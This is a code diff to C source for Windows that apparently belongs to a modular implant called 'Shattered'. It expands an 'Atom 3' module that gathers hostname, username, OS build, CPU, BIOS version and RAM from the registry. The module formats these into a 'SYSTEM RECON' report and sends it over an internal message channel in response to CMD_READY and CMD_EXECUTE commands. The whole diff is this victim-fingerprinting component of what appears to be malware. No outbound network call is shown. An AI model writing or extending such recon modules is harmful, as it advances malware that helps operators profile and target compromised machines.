@@ -123,26 +123,57 @@ DWORD WINAPI SystemInfoAtomMain(LPVOID lpParam) {
   printf("[Atom 3] Sent CMD_READY.\n");
 
   // Collect and send immediate system info report
-  char szComputerName[MAX_COMPUTERNAME_LENGTH + 1] = {0};
-  char szUserName[256] = {0};
-  DWORD dwCNameLen = sizeof(szComputerName), dwUNameLen = sizeof(szUserName);
+  char szHost[256] = {0}; DWORD dHost = sizeof(szHost);
+  char szUser[256] = {0}; DWORD dUser = sizeof(szUser);
+  GetComputerNameA(szHost, &dHost); GetUserNameA(szUser, &dUser);
+  
+  MEMORYSTATUSEX memInfo;
+  memInfo.dwLength = sizeof(MEMORYSTATUSEX);
+  GlobalMemoryStatusEx(&memInfo);
+  DWORDLONG totalPhysMem = memInfo.ullTotalPhys / (1024 * 1024);
 
-  if (!GetComputerNameA(szComputerName, &dwCNameLen)) {
-    lstrcpyA(szComputerName, "UNKNOWN");
+  char cpuName[256] = "Unknown CPU";
+  char osName[256] = "Unknown OS";
+  char buildNum[64] = "Unknown Build";
+  char biosVer[256] = "Unknown BIOS";
+  DWORD sz;
+  HKEY hKey;
+
+  // CPU Name
+  if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+      sz = sizeof(cpuName);
+      RegQueryValueExA(hKey, "ProcessorNameString", NULL, NULL, (LPBYTE)cpuName, &sz);
+      RegCloseKey(hKey);
   }
-  if (!GetUserNameA(szUserName, &dwUNameLen)) {
-    lstrcpyA(szUserName, "UNKNOWN");
+
+  // OS Info
+  if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+      sz = sizeof(osName);
+      RegQueryValueExA(hKey, "ProductName", NULL, NULL, (LPBYTE)osName, &sz);
+      sz = sizeof(buildNum);
+      RegQueryValueExA(hKey, "CurrentBuild", NULL, NULL, (LPBYTE)buildNum, &sz);
+      RegCloseKey(hKey);
   }
 
-  // Get actual architecture
-  SYSTEM_INFO si;
-  GetSystemInfo(&si);
-  const char* arch = (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64) ? "x64" : "x86";
+  // BIOS Info
+  if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\BIOS", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+      sz = sizeof(biosVer);
+      RegQueryValueExA(hKey, "BIOSVersion", NULL, NULL, (LPBYTE)biosVer, &sz);
+      RegCloseKey(hKey);
+  }
 
-  char report[1024];
-  sprintf_s(report,
-            "[SYS_INFO] User: %s | Host: %s | Arch: %s | Status: ACTIVE",
-            szUserName, szComputerName, arch);
+  char report[2048];
+  sprintf_s(report, 
+            "\n=== SHATTERED SYSTEM RECON ===\n"
+            "[+] Hostname   : %s\n"
+            "[+] Username   : %s\n"
+            "[+] OS Name    : %s\n"
+            "[+] OS Build   : %s\n"
+            "[+] CPU Model  : %s\n"
+            "[+] BIOS Ver   : %s\n"
+            "[+] Total RAM  : %llu MB\n"
+            "==============================\n",
+            szHost, szUser, osName, buildNum, cpuName, biosVer, totalPhysMem);
   printf("[Atom 3] Immediate report: %s\n", report);
 
   IPC_MESSAGE outMsg = {0};
@@ -166,20 +197,52 @@ DWORD WINAPI SystemInfoAtomMain(LPVOID lpParam) {
         if (inMsg.CommandId == CMD_EXECUTE) {
           printf("[Atom 3] Received CMD_EXECUTE. Re-collecting sysinfo.\n");
           // Re-collect and send fresh sysinfo
-          char szHost[MAX_COMPUTERNAME_LENGTH + 1] = {0};
-          char szUsr[256] = {0};
-          DWORD dwHLen = sizeof(szHost), dwULen = sizeof(szUsr);
-          GetComputerNameA(szHost, &dwHLen);
-          GetUserNameA(szUsr, &dwULen);
+          char szHost[256] = {0}; DWORD dHost = sizeof(szHost);
+          char szUser[256] = {0}; DWORD dUser = sizeof(szUser);
+          GetComputerNameA(szHost, &dHost); GetUserNameA(szUser, &dUser);
+          
+          MEMORYSTATUSEX memInfo;
+          memInfo.dwLength = sizeof(MEMORYSTATUSEX);
+          GlobalMemoryStatusEx(&memInfo);
+          DWORDLONG totalPhysMem = memInfo.ullTotalPhys / (1024 * 1024);
 
-          SYSTEM_INFO si;
-          GetSystemInfo(&si);
-          const char* arch = (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64) ? "x64" : "x86";
+          char cpuName[256] = "Unknown CPU";
+          char osName[256] = "Unknown OS";
+          char buildNum[64] = "Unknown Build";
+          char biosVer[256] = "Unknown BIOS";
+          DWORD sz;
+          HKEY hKey;
 
-          char freshReport[1024];
-          sprintf_s(freshReport,
-                    "[SYS_INFO] User: %s | Host: %s | Arch: %s | Status: ACTIVE",
-                    szUsr, szHost, arch);
+          if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+              sz = sizeof(cpuName);
+              RegQueryValueExA(hKey, "ProcessorNameString", NULL, NULL, (LPBYTE)cpuName, &sz);
+              RegCloseKey(hKey);
+          }
+          if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+              sz = sizeof(osName);
+              RegQueryValueExA(hKey, "ProductName", NULL, NULL, (LPBYTE)osName, &sz);
+              sz = sizeof(buildNum);
+              RegQueryValueExA(hKey, "CurrentBuild", NULL, NULL, (LPBYTE)buildNum, &sz);
+              RegCloseKey(hKey);
+          }
+          if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\BIOS", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+              sz = sizeof(biosVer);
+              RegQueryValueExA(hKey, "BIOSVersion", NULL, NULL, (LPBYTE)biosVer, &sz);
+              RegCloseKey(hKey);
+          }
+
+          char freshReport[2048];
+          sprintf_s(freshReport, 
+                    "\n=== SHATTERED SYSTEM RECON ===\n"
+                    "[+] Hostname   : %s\n"
+                    "[+] Username   : %s\n"
+                    "[+] OS Name    : %s\n"
+                    "[+] OS Build   : %s\n"
+                    "[+] CPU Model  : %s\n"
+                    "[+] BIOS Ver   : %s\n"
+                    "[+] Total RAM  : %llu MB\n"
+                    "==============================\n",
+                    szHost, szUser, osName, buildNum, cpuName, biosVer, totalPhysMem);
 
           IPC_MESSAGE rptMsg = {0};
           rptMsg.dwSignature = 0x534D4952;
